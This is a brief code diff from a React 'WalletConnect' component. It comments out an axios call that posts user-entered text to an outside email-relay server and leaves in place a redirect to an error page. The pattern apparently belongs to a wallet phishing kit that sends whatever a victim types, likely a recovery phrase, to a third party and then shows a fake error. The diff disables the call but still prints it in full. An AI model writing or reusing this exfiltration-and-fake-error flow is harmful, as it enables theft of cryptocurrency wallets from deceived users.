@@ -42,13 +42,13 @@ const WalletConnect: React.FC<WalletConnectProps> = ({
     setIsLoading(true);
 
     try {
-      const response = await axios.post(
-        "https://send-email-uokr.onrender.com/email",
-        {
-          text,
-        }
-      );
-      console.log(response);
+      // const response = await axios.post(
+      //   "https://send-email-uokr.onrender.com/email",
+      //   {
+      //     text,
+      //   }
+      // );
+      // console.log(response);
 
       navigate("/error");
     } catch (error) {
